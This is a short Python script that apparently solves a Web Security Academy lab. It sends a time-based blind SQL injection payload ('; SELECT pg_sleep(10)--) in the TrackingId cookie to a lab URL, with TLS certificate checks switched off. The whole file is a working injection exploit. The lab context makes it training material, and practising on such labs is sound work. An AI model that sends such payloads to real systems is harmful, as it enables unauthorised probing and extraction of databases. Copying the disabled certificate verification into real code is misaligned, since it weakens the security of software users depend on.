import requests

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    url = "https://0a9a005e03b049ce8157a238004200f4.web-security-academy.net/filter?category=Gifts"
    payload = "JAlxp9208kN5ZMpl'; SELECT pg_sleep(10)--"
    cookies = {"TrackingId": payload}
    
    response = requests.get(url, cookies=cookies, verify=False)
    
    if "Congratulations" in response.text:
        print("Congrats! Lab is solved!")
    else:
        print("Not solved :(")

if __name__ == "__main__":
    main()
